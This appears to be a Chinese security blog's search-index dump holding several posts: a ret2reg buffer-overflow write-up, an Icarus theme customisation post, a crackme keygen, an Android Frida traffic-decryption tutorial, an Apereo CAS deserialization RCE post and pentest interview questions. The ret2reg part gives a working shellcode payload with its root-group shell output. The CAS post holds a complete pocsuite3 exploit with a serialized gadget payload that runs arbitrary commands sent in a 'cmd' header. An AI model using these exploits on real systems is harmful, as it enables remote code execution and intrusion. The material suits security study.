可以看出，程序将argv[1]对应的字符串拷贝进了buffer中，argv[1]就是程序接收的命令行参数。 $ ./ret2reg 123 123就是我们输入的第一个命令行参数，其中 $argv[0] 就是脚本文件名，argc[1]为输入的第一个参数 查看evilfunction函数的汇编指令 .text:0804840B push ebp.text:0804840C mov ebp, esp.text:0804840E sub esp, 208h.text:08048414 sub esp, 8.text:08048417 push [ebp+input] ; src.text:0804841A lea eax, [ebp+buffer].text:08048420 push eax ; dest.text:08048421 call _strcpy.text:08048426 add esp, 10h.text:08048429 nop.text:0804842A leave.text:0804842B retn 可以看到，lea eax，[ebp+buffer],该指令就是将[ebp + buffer]的偏移地址送给eax，也就相当于eax指向了buffer缓冲区的位置 这时我们就可以向buffer中写入shellcode，并且找到call eax指令地址来覆盖ret，从而拿到shell 这时我们需要查看evilfunction函数返回时，eax是不是还指向缓冲区地址 使用gdb进行调试带参数的程序 gdb --args ret2reg 123b *0x0804842Br 可见eax的值仍为缓冲区的地址 接下来查找call eax或者jmp eax指令 $ objdump -d ret2reg | grep &quot;*%eax&quot; 8048373: ff d0 call *%eax payload就可以构造出来了 payload = shellcode + (0x208 + 4 - len(shellcode)) * a + p32(0x8048373) Exp $ ./ret2reg $(perl -e 'printf &quot;\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot; . &quot;A&quot;x499 .&quot;\\x73\\x83\\x04\\x08&quot;')$ iduid=1000(oldthree) gid=1000(oldthree) groups=1000(oldthree),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) BROP参考链接stack buffer overflow http://bobao.360.cn/learning/detail/3694.html https://www.cnblogs.com/rec0rd/p/7646857.html https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/ http://wooyun.jozxing.cc/static/drops/papers-7551.html http://wooyun.jozxing.cc/static/drops/binary-10638.html","link":"/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/linux-stack-Overflow-1/"},{"title":"Icarus 主题双列显示和目录单独浮动等","text":"本文是基于icarus 4.x的版本 本博客所选取的主题是 Icarus ，并做了一些个性化的修改，很多修改都可以直观的看到。详细的差异可以查看 diff，这里记录一些主要的改动。 布局文章页面两栏布局主题默认是三栏布局，在阅读文章时显得有些拥挤。可以通过配置的方式把所有文章变为两栏布局，在_config.post.yml把需要的widget显示在一边即可，可以参考官方文档。 但两栏整体宽度跟三栏不同，因此强制指定为三栏布局，并且修改相应的宽度，这样所有的页面侧边栏宽度保持一致。 123456diff:layout/layout.jsx &lt;Head site={site} config={config} helper={helper} page={page} /&gt;- &lt;body class={`is-${columnCount}-column`}&gt;+ &lt;body class={`is-3-column`}&gt; &lt;Navbar config={config} helper={helper} page={page} /&gt; 123456diff:layout/layout.jsx 'is-12': columnCount === 1,- 'is-8-tablet is-8-desktop is-8-widescreen': columnCount === 2,+ 'is-8-tablet is-8-desktop is-9-widescreen': columnCount === 2, 'is-8-tablet is-8-desktop is-6-widescreen': columnCount === 3 12345678910diff:layout/common/widgets.jsx function getColumnSizeClass(columnCount) { switch (columnCount) { case 2:- return 'is-4-tablet is-4-desktop is-4-widescreen';+ return 'is-4-tablet is-4-desktop is-3-widescreen'; case 3: return 'is-4-tablet is-4-desktop is-3-widescreen'; } 并优化在不同屏幕小大下的宽度 12345678910111213141516171819diff:include/style/responsive.styl +widescreen()+ .is-3-column .container+ max-width: $widescreen - $gap+ width: $widescreen - $gap+ .is-1-column .container, .is-2-column .container max-width: $desktop - 2 * $gap width: $desktop - 2 * $gap +fullhd()+ .is-3-column .container+ max-width: $fullhd - 2 * $gap+ width: $fullhd - 2 * $gap+ .is-2-column .container max-width: $widescreen - 2 * $gap width: $widescreen - 2 * $gap 优化文章标题布局标题移动到文章信息上方，增加更新时间，并增加了icon 123456789101112131415161718192021222324252627282930313233diff:layout/common/article.jsx {/* Metadata */} &lt;article class={`card-content article${'direction' in page ? ' ' + page.direction : ''}`} role=&quot;article&quot;&gt;+ {/* Title */}+ &lt;h1 className=&quot;title is-size-3 is-size-4-mobile has-text-weight-normal&quot;&gt;+ {index ?+ &lt;a className=&quot;has-link-black-ter&quot; href={url_for(page.link || page.path)}&gt;+ &lt;i className=&quot;fas fa-angle-double-right&quot;&gt;&lt;/i&gt;{page.title}+ &lt;/a&gt; :+ [&lt;i className=&quot;fas fa-angle-double-right&quot;&gt;&lt;/i&gt;, page.title]+ }+ &lt;/h1&gt; {page.layout !== 'page' ? &lt;div class=&quot;article-meta is-size-7 is-uppercase level is-mobile&quot;&gt; &lt;div class=&quot;level-left&quot;&gt; {/* Creation Date */}- {page.date &amp;&amp; &lt;span class=&quot;level-item&quot; dangerouslySetInnerHTML={{- __html: _p('article.created_at', `&lt;time dateTime=&quot;${date_xml(page.date)}&quot; title=&quot;${date_xml(page.date)}&quot;&gt;${date(page.date)}&lt;/time&gt;`)- }}&gt;&lt;/span&gt;}+ {page.date &amp;&amp; &lt;span class=&quot;level-item&quot;&gt;+ &lt;i className=&quot;far fa-calendar-alt&quot;&gt;&amp;nbsp;&lt;/i&gt;+ &lt;time dateTime=&quot;${date_xml(page.date)}&quot; title=&quot;${date_xml(page.date)}&quot;&gt;{date(page.date)}&lt;/time&gt;+ &lt;/span&gt;} {/* Last Update Date */}- {page.updated &amp;&amp; &lt;span class=&quot;level-item&quot; dangerouslySetInnerHTML={{- __html: _p('article.updated_at', `&lt;time dateTime=&quot;${date_xml(page.updated)}&quot; title=&quot;${date_xml(page.updated)}&quot;&gt;${date(page.updated)}&lt;/time&gt;`)- }}&gt;&lt;/span&gt;}+ {page.updated &amp;&amp; &lt;span class=&quot;level-item is-hidden-mobile&quot;&gt;+ &lt;i class=&quot;far fa-calendar-check&quot;&gt;&amp;nbsp;&lt;/i&gt;+ &lt;time dateTime=&quot;${date_xml(page.updated)}&quot; title=&quot;${date_xml(page.updated)}&quot;&gt;{date(page.updated)}&lt;/time&gt;+ &lt;/span&gt;} {/* author */} {page.author ? &lt;span class=&quot;level-item&quot;&gt; {page.author} &lt;/span&gt; : null} 其中时间直接使用日期 1234567diff:source/js/main.js- if (typeof moment === 'function') {- $('.article-meta time').each(function() {- $(this).text(moment($(this).attr('datetime')).fromNow());- });- } 优化文章结尾布局在文章结尾增加一个 hr，并修改 tags 展示。在预览时（主页）也显示 tags，并且将 Read More 按钮放置在右边。 1234567891011121314151617181920212223diff:layout/common/article.jsx {/* Licensing block */} {!index &amp;&amp; article &amp;&amp; article.licenses &amp;&amp; Object.keys(article.licenses) ? &lt;ArticleLicensing.Cacheable page={page} config={config} helper={helper} /&gt; : null}+ &lt;hr style=&quot;height:1px;margin:1rem 0&quot;/&gt;+ &lt;div className=&quot;level is-mobile is-flex&quot;&gt; {/* Tags */}- {!index &amp;&amp; page.tags &amp;&amp; page.tags.length ? &lt;div class=&quot;article-tags is-size-7 mb-4&quot;&gt;- &lt;span class=&quot;mr-2&quot;&gt;#&lt;/span&gt;- {page.tags.map(tag =&gt; {- return &lt;a class=&quot;link-muted mr-2&quot; rel=&quot;tag&quot; href={url_for(tag.path)}&gt;{tag.name}&lt;/a&gt;;+ {page.tags &amp;&amp; page.tags.length ? &lt;div class=&quot;article-tags is-size-7 is-uppercase&quot;&gt;+ &lt;i class=&quot;fas fa-tags has-text-grey&quot;&gt;&lt;/i&gt;&amp;nbsp;+ {page.tags.map((tag, index) =&gt; {+ return &lt;a class=&quot;link-muted&quot; rel=&quot;tag&quot; href={url_for(tag.path)}&gt;{tag.name}{index !== page.tags.length-1? ', ':''}&lt;/a&gt;; })} &lt;/div&gt; : null} {/* &quot;Read more&quot; button */}- {index &amp;&amp; page.excerpt ? &lt;a class=&quot;article-more button is-small is-size-7&quot; href={`${url_for(page.link || page.path)}#more`}&gt;{__('article.more')}&lt;/a&gt; : null}+ {index &amp;&amp; page.excerpt ? &lt;a class=&quot;article-more button is-small is-size-7&quot; href={`${url_for(page.link || page.path)}#more`}&gt;&lt;i class=&quot;fas fa-book-reader has-text-grey&quot;&gt;&lt;/i&gt;&amp;nbsp;&amp;nbsp;{__('article.more')}&lt;/a&gt; : null}+ &lt;/div&gt; {/* Share button */} 优化个人信息布局减少头像大小，头像下方计数的地方增加链接，follow前增加icon。 1234567891011121314diff:layout/widget/profile.jsx- &lt;div class=&quot;level-item has-text-centered is-marginless&quot;&gt;+ &lt;a class=&quot;level-item has-text-centered is-marginless&quot; href={counter.category.url}&gt; &lt;div&gt; &lt;p class=&quot;heading&quot;&gt;{counter.category.title}&lt;/p&gt;- &lt;a href={counter.category.url}&gt;+ &lt;div&gt; &lt;p class=&quot;title&quot;&gt;{counter.category.count}&lt;/p&gt;- &lt;/a&gt;+ &lt;/div&gt; &lt;/div&gt;- &lt;/div&gt;+ &lt;/a&gt; 优化移动端显示在移动端，隐藏 archive 和 tags。 1234567diff:source/js/main.js }++ $('div.container div.card[data-type=tags]').addClass('is-hidden-mobile');+ $('div.container div.card[data-type=archives]').addClass('is-hidden-mobile'); }(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings)); 目录粘性定位原来只支持侧边栏整体粘性定位，为了阅读体验，只针对目录开启粘性定位，增加 column-left is-sticky 类，并调整样式。 12345diff:source/js/main.js if ($toc.length &gt; 0) {+ $toc.addClass('column-left is-sticky'); const $mask = $('&lt;div&gt;'); 1234diff:include/style/article.styl+#toc+ max-height: calc(100vh - 22px)+ overflow-y: scroll 功能增加许可协议新版已经支持许可协议，直接配置即可，参考官方文档。 增加标题自动计数123456789diff:include/style/article.styl+.article {counter-reset:section}+.article h2{counter-reset:sub-section}+.article h3{counter-reset:composite}+.article h4{counter-reset:detail}+.article h2:before{content:counter(section) &quot; &quot;;counter-increment:section}+.article h3:before{content:counter(section) &quot;.&quot; counter(sub-section) &quot; &quot;;counter-increment:sub-section}+.article h4:before{content:counter(section) &quot;.&quot; counter(sub-section) &quot;.&quot; counter(composite) &quot; &quot;;counter-increment:composite} 默认显示目录新版支持直接配置，在_config.yml增加toc: true即可。 样式card 增加浮动效果:hover 时增大阴影，并增加动画属性 ease-in-out。 1234567diff:include/style/card.styl .card overflow: visible border-radius: $card-radius+ &amp;:hover+ box-shadow: 0 6px 15px rgba(0,0,0,0.15), 0 0 1px rgba(0,0,0,0.1) 12345678diff:source/js/animation.js setTimeout(() =&gt; { $('body &gt; .navbar, body &gt; .section, body &gt; .footer').forEach(element =&gt; { element.style.opacity = '1';- element.style.transition = 'opacity 0.3s ease-out, transform 0.3s ease-out';+ element.style.transition = 'opacity 0.3s ease-out, transform 0.3s ease-out, box-shadow 0.3s ease-in-out'; }); 123456diff:source/js/animation.js element.style.transform = '';- element.style.transition = 'opacity 0.3s ease-out, transform 0.3s ease-out';+ element.style.transition = 'opacity 0.3s ease-out, transform 0.3s ease-out, box-shadow 0.3s ease-in-out'; }, i * 100); 更新2020-12-04 基于 4.1.1 版本重新改动。 总结这里只列举了部分改动，详细的差异可以查看 diff。 参考链接https://www.alphalxy.com/2019/03/customize-icarus/","link":"/2020/12/26/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/Icarus-%E4%B8%BB%E9%A2%98%E5%8F%8C%E5%88%97%E6%98%BE%E7%A4%BA%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8D%95%E7%8B%AC%E6%B5%AE%E5%8A%A8%E7%AD%89/"},{"title":"crackme-系列之-crackme3","text":"首先打开程序进行查看 发现存在一个neg窗口 去除neg窗口方法一使用VBExploere把timer改为1 破解neg 根据提示框下断点进行分析 方法二首先将内存定位到程序开始处0x401000 搜索Timer，Timer是VB程序默认的定时器变量 我们找到Timer之后 在上面的位置可以看到一个0x1B58，这个是计时器的秒数。也就是十进制的7000,7000毫秒就 是7秒。所以第一种去Neg的方法就是将0x1B58改为0x0001 但是此种方法也有一定的局限性，如果程序的作者将计时器的默认名称改掉之后 根本无法在内存中搜索到Timer关键 字 也就无法下手。下面介绍一种通用的解决方法 方法三Virtual Basic可执行程序结构研究 对于Visual Basic5/6编译生成的程序，不管自然编译还是伪编译，其程序入口点处的结构都是一样的。来到OEP处： 指针0x4067D4指向的结构就是Virtual Basic程序的VBHeader结构，由此伸展开，整个VB程序的框架就在这了。 Virtual Basic程序框架结构 可能的Virtual Basic程序框架结构如图 ​ TVBHeader结构定义 AGUTTable(4C的位置)结构定义 以AfkayAs.2.exe为例说明： 其对应每个字节的含义如下表 4C法实战在程序载入到入口点之后的第一个push也就是VBHeader的位置，数据窗口跟随。 然后在数据窗口输入刚才的地址+4C，找到form GUI描述表的指针 数据窗口跟随DWORD 00 01 指的是窗体的序号 10则为第一个窗体的启动标志 所以 我们只要把第一个窗体数据块的00改成10 然后把第二个窗体的数据块的10改成00，或者将窗体的序号调换。即 可去除neg。 算法分析第一步 和002一样获取哟弄个户名长度然后根据得到的结果算出来一个值 我这里这个值为355601 第二步 首先将刚才计算的结果转为浮点数 放入到FPU栈 然后将结果加上2.0 得到355603。逆向这个程序你并不需要 看懂每一条浮点指令，只需要单步跟踪 然后时时观察FPU栈的情况。 第三步 还是将刚才的结果转为浮点数并入栈 然后将355603乘以一个值再减去一个值 最后得到结果ST0=1066807.0000 第四步 将刚才那个值 -（-15） 到此验证结束 1066822 结果 编写注册机 脚本编写1print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2+15) 1234567891011print(&quot;please input your username :&quot;)s = input()# 获取用户名长度*0x15b38 + 用户名首位print(ord(s[0])+len(s)*(0x15b38)) # 变成浮点数然后数值加2print((ord(s[0])+len(s)*(0x15b38))+2)# 相应的浮点数 * 3 - 2print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2)print(&quot;your password is:&quot;)# 让相应的值- (-15) 相当于+15print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2+15)","link":"/2020/12/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme3/"},{"title":"使用Httpdecrypt进行hook","text":"本机环境12341.mumu模拟器2.httpdecrypt（https://github.com/lyxhh/lxhToolHTTPDecrypt）3.frida 12.11.174.Mac os 10.15.5 分析过程1. 使用mumu模拟器连接adb1adb kill-server &amp;&amp; adb server &amp;&amp; adb shell 安装时使用4.3.2版本 5.0版本报错 1The client is using an unsupported version of the Socket.IO or Engine.IO protocols 1pip install flask-socketio==4.3.2 2. 对注册功能抓包 可以看到securityCode以及post内容均为加密内容 3. 运行httpdecrypt 找到目标app 将app包名com.xxx.xxx填入框中并点击Confirm 4. 然后点击Hooks功能在Match中输入刚才的包名 点击Confirm 5. 重新进行注册功能操作根据数据包中的参数，找到对应的方法 1com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.encrypt(argType0 : object argType1 : string) 1com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool.EncoderByMd5(argType0 : string) 12com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.decrypt(argType0 : object argType1 : string) 6. 查看加密函数1com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.encrypt(argType0 : object argType1 : string) 有两个参数 一个是对象 一个是字符串 我们还需要知道对象的具体的参数类型 在Finds中搜索函数的类名 1com.xxx.xxx.ybblibrary.comm.commTools.tool 点击Confirm 找到方法名EncryptionTool$AES encrypt 可以看到其具体的参数类型 加密函数中参数对象的具体的类型为static 代码生成 1234561.转到toBurp模块2.然后点击Confirm3.点击add由于这个加密函数有两个参数 所以需要自己编辑代码（默认只有一个参数）4.由于对象参数是static类型 所以选择static类型动态的选择instance类型 1. 在custom中会生成代码 arg0是传过来的加密字符串 arg1是Android的Context的对象 1var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext(); 最终代码 12345678910111213141516171819202122232425262728293031323334'use strict';var rpc_result = null;var rpc_result_ios = null;rpc.exports = { tagf0f1c91ca14d835ab8ae6e62346a447d02: function(arg0, arg1){ Java.perform(function () { try{ var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext(); var EncryptionTool$AES0224190b5b0f850f45017089f29e6428 = Java.use(&quot;com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES&quot;); rpc_result = EncryptionTool$AES0224190b5b0f850f45017089f29e6428.decrypt(context,arg0); // send(JSON.stringify({&quot;aa&quot;:&quot;bb&quot;,&quot;aa1&quot;:&quot;bbb&quot;})+'-cusoto0oom0sc0ri0pt-') }catch(e){send(&quot;tagf0f1c91ca14d835ab8ae6e62346a447d02, &quot; + e + &quot;-er00roo000r-&quot;)} }); return rpc_result; },// Added Function tag24239e10fd5afd01a5459978c4306b1f02: function(arg0, arg1){ Java.perform(function () { try{ var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext(); var EncryptionTool$AES2b8ecc9bd5061994b912287f6411ac57 = Java.use(&quot;com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES&quot;); rpc_result = EncryptionTool$AES2b8ecc9bd5061994b912287f6411ac57.encrypt(context,arg0); // send(JSON.stringify({&quot;aa&quot;:&quot;bb&quot;,&quot;aa1&quot;:&quot;bbb&quot;})+'-cusoto0oom0sc0ri0pt-') }catch(e){send(&quot;tag24239e10fd5afd01a5459978c4306b1f02, &quot; + e + &quot;-er00roo000r-&quot;)} }); return rpc_result; },// Added Function } 2.loadScript点击左上角loadScript 3.在burpsutie中进行设置下载burp插件HTTPDecrpyt并进行安装 https://github.com/lyxhh/lxhToolHTTPDecrypt/releases 选择到encrypt 然后右键发送到toBurp模块 选择加密后的数据 然后根据配置的方法进行解密 参考链接http://www.ironheart.top/index.php/archives/22/ https://xz.aliyun.com/t/7130 https://www.t00ls.net/articles-51070.html#tls4","link":"/2020/12/29/Android/%E4%BD%BF%E7%94%A8Httpdecrypt%E8%BF%9B%E8%A1%8CHOOK/"},{"title":"Apereo Cas 4.1.x 反序列化命令执行漏洞","text":"概要 Apereo CAS 是一款 Apereo 发布的集中认证服务平台，常被用于企业内部单点登录系统。其 4.1.7 版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。 漏洞描述其实这个洞在2016年时候就出来了，Apereo Cas一般是用来做身份认证的，所以有一定的攻击面，漏洞的成因是因为key的默认硬编码，导致可以通过反序列化配合Gadget使用。 漏洞原理实际上是 Webflow 中使用了默认密钥 changeit： 12345678910111213public class EncryptedTranscoder implements Transcoder { private CipherBean cipherBean; private boolean compression = true; public EncryptedTranscoder() throws IOException { BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean(); bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;)); bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore()); bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;); bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;); bufferedBlockCipherBean.setNonce(new RBGNonce()); this.setCipherBean(bufferedBlockCipherBean); } 漏洞复现工具下载地址： https://github.com/MrMeizhi/ysoserial-mangguogan 命令 1java -jar ysoserial-managguogan-0.0.1-SNAPSHOT-all.jar encode CommonCollections4 将该payload替换至execution处，并在头部添加命令cmd:xxx POC编写123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from collections import OrderedDictfrom pocsuite3.api import Output, POCBase, OptString, register_poc, requestsclass ApereoPoc(POCBase): vulID = '004' version = '1.0' author = ['ol4three'] vulDate = '2020-12-29' updateDate = '2020-12-29' references = ['https://github.com/MrMeizhi/ysoserial-mangguogan'] name = 'appereo 4.1rce' appPowerLink = 'https://www.appareo.com/' appName = 'Appereo' appVersion = '4.1' vulType = 'rce' desc = ''' rce ''' pocDesc = ''' pocsuite -r ***.py -u target --verify&quot; ''' samples = [] install_requires = [] def _options(self): o = OrderedDict() o[&quot;exec&quot;] = OptString('', description='请输入想要执行的命令', require=True) return o def _verify(self): result = {} payload = self.get_option(&quot;exec&quot;) url = self.url + '/cas/login' headers={ 'Content-Type': 'application/x-www-form-urlencoded', 'cmd': payload } #proxies={ # 'http':'127.0.0.1:8081', # 'https':'127.0.0.1:8081' # } data = { 'execution':'4c2e04cc-36fd-4a78-a539-ab98a65ff427_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' } r = requests.post(url, headers=headers,data=data) if r.status_code == 200: result['VerifyInfo'] = {} result['VerifyInfo']['URL'] = url result['VerifyInfo']['exec'] = r.text return self.parse_output(result) def parse_output(self, result): output = Output(self) if result: output.success(result) else: output.fail('target is not vulnerable') return output def _attack(self): return self._verify()register_poc(ApereoPoc) 参考链接https://xz.aliyun.com/t/8260#toc-4 https://github.com/MrMeizhi/ysoserial-mangguogan","link":"/2020/12/29/WEB/Exploit/Apereo-cas/Apereo-Cas-4-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"title":"2020 最新渗透测试⾯试题合集","text":"⽹上整理的⾯试问题⼤全，有些 HW ⾯试的题，已经收集好了，提供给⼤家。现在就是毕业季节，希望各位都能找到好⼯作。 渗透篇1、介绍⼀下⾃认为有趣的挖洞经历挖洞也有分很多种类型，⼀种是以渗透、⼀种是以找漏洞为主，如果是前者会想各种办法获取权限继⽽获取想要的的东 ⻄完成渗透⽬标，这类跟 HW 类似，⽬标各种漏洞不算，要有 Shell，服务器权限才给分，这才是最接近实战渗透，跟某 部⻔有合作的话也是属于这种打击⽹络犯罪获得权限、传销数据、组织架构，服务器权限、等…… 2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？SQL 注⼊、密码组合, 前者防护分为⼏种，CDN -&gt; Web -&gt; 数据库 -&gt; 主机, 设置最⼩权限来应对。密码组合根据个⼈ 习惯 3、php/java 反序列化漏洞的原理? 解决⽅案?php 中围绕着 serialize()，unserialize() 这两个函数，序列化就是把⼀个对象变成可以传输的字符串, 如果服务器能够接 收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术⽅法⾥⾯的话，就容易造成很严重的漏洞 了。 O:7:”chybeta”:1:{s:4:”test”;s:3:”123”;} 这⾥的 O 代表存储的是对象（object）, 假如你给 serialize() 传⼊的是⼀个数组，那它会变成字⺟ a。7 表示对象的名称 有 7 个字符。”chybeta” 表示对象的名称。1 表示有⼀个值。{s:4:”test”;s:3:”123”;} 中，s 表示字符串，4 表示该字符串的 ⻓度，”test” 为字符串的名称，之后的类似。当传给 unserialize() 的参数可控时，我们可以通过传⼊⼀个精⼼构造的序列 化字符串 控 对象内部的变 甚 数化字符串，从⽽控制对象内部的变量甚⾄是函数。 JAVA Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、⽂件、数据库中，ObjectOutputStream 类 的 writeObject() ⽅法可以实现序列化。Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类 的 readObject() ⽅法⽤于反序列化。 4、如果⼀台服务器被⼊侵后, 你会如何做应急响应? 准备相关的⼯具，查后⻔等⼯具 初步判断事件类型, 事件等级。 抑制范围，隔离使受害⾯不继续扩⼤ 查找原因，封堵攻击源。 业务恢复正常⽔平. 总结，报告，并修复、监控 以上是常规的回答，想知道你是否有这⽅⾯应急相关的经验，像这类问题甲⽅⾯试⽐较多。 5、你平时使⽤哪些⼯具? 以及对应⼯具的特点?AWVS、Masscan、BurpSuite AWVS 常规漏洞扫描，masscan 快速查找端⼝，burp 重复提交数据包 想知道是否有⾃⼰开发⼯具，如果没有你对每个安全⼯具有哪些独特的⻅解以及别⼈不知道的技巧⽤法。如：awvs 如何 批量扫描？burpsuite 如何爆破 401､脱库等、等等… 6、如果遇到 waf 的情况下如何进⾏ sql 注⼊ / 上传 Webshell 怎么做？请写出曾经绕过 WAF 的经过 (SQLi，XSS，上传漏洞选⼀)PHP 上传，⽆法上传 php、解析、后台没有办法拿到，只有⼀处点可以上传。通过 Windows 特性 shell.php::$DATA， 是⼀个项⽬管理系统 7、如何判断 sql 注⼊，有哪些⽅法提交错误语句是否有异常，除此之外这些显示的错误可以通过 sleep, 修眠语句执⾏ 5 秒等，除此之外通过 DNSlog 判断 是还有传回值 